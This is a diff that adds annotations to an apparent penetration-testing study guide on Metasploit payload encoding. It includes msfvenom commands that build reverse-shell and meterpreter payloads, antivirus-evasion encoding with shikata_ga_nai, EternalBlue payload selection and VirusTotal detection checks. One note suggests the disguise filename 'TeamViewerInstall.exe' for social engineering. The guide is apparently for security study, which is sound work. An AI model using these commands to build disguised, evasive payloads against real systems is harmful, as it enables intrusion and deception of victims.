@@ -49,6 +49,7 @@ Encoders transform payloads to make them compatible with different processor arc
 # Separate tools in /usr/share/framework2/
 msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
 ```
+> Deprecated. `msfpayload` generated the payload and piped it into `msfencode`. Both tools are gone — use `msfvenom` instead.
 
 ### Post-2015 (Current — msfvenom)
 
@@ -56,6 +57,7 @@ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b
 # Combined into msfvenom
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
 ```
+> `-a x86` sets architecture, `--platform windows` sets OS, `-p` is the payload, `-b` removes null bytes, `-e` specifies the encoder, `-f perl` outputs as Perl shellcode.
 
 ---
 
@@ -69,6 +71,7 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
 # Found 11 compatible encoders
 # Automatically selects x86/shikata_ga_nai
 ```
+> When you specify `-b` bad characters, msfvenom automatically picks the best compatible encoder. You don't always need `-e`.
 
 ### With Explicit Encoder
 
@@ -76,6 +79,7 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
   LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
 ```
+> Explicitly selects `shikata_ga_nai`. Same as above but forces this encoder even if others might score better. Swap `-f perl` for `-f exe` to generate a Windows executable instead.
 
 ### Multiple Iterations (`-i`)
 
@@ -86,6 +90,7 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
 # Encodes 10 times — payload grows with each iteration
 # Still detected by ~52/65 AV engines
 ```
+> `-i 10` runs 10 encoding passes. `-o` writes the output to a file. Using a believable filename like `TeamViewerInstall.exe` helps with social engineering. Note: 10 iterations still gets caught by most AV.
 
 ### Key msfvenom Flags for Encoding
 
@@ -109,6 +114,7 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
 msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
 ```
+> Set the payload first so MSF knows the architecture, then run `show encoders` to see only compatible options. x64 payloads have fewer encoders than x86.
 
 Encoders are **auto-filtered** to match the current exploit + payload architecture.
 
@@ -154,6 +160,7 @@ Encoders are **auto-filtered** to match the current exploit + payload architectu
 # Requires free VirusTotal API key (register at virustotal.com)
 msf-virustotal -k <API_KEY> -f TeamViewerInstall.exe
 ```
+> `-k` takes your VirusTotal API key, `-f` is the file to check. Returns detection counts from 60+ AV engines. Replace `<API_KEY>` with your actual key from virustotal.com.
 
 Returns detection results from 60+ AV engines without manually uploading.
 
